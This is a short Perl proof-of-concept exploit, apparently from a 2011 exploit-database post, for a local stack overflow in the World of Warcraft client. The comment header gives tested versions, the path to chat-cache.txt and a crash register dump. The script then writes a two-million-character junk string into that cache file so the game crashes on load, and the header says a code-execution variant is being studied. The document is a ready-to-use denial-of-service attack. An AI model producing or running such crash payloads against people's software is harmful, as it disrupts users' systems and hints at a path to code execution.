#!/usr/bin/perl
#
#Exploit Title:
#World Of Warcraft Local Stack Overflow Dos Exploit (chat-cache.txt)
#
#Date: 04/09/2011
#
#Author: BSOD Digital (Fabien DROMAS)
#
#Other details:"Code Exec" Exploit in analysis.
#
#Tests:
#OS: Windows 7
#Versions: burning crusade,cataclism, Demo Version.
#
#Path:
#world of warcraft > WTF > account > file (numbers) > server_file > account_name_file > chat-cache.txt
#
#Error:
#This application has encountered a critical error:
#
#ERROR #132 (0x85100084) Fatal exception!
#
#Program:	D:\World of Warcraft\Wow.exe
#ProcessID:	92024
#Exception:	0xC00000FD (STACK_OVERFLOW) at 0023:0109DA97
#
#Registers:
#----------------------------------------
#    x86 Registers
#----------------------------------------
#
#EAX=000F2000  EBX=1BD920D8  ECX=000CC22C  EDX=00000000  ESI=0012366F
#EDI=00000000  EBP=001EFC5C  ESP=001EF8A4  EIP=0109DA97  FLG=00010206
#CS =0023      DS =002B      ES =002B      SS =002B      FS =0053      GS =002B


my $file = "chat-cache.txt";
my $dos_junk = "A" x 2000000;
open($File, ">$file");
print $File $dos_junk;
close($File);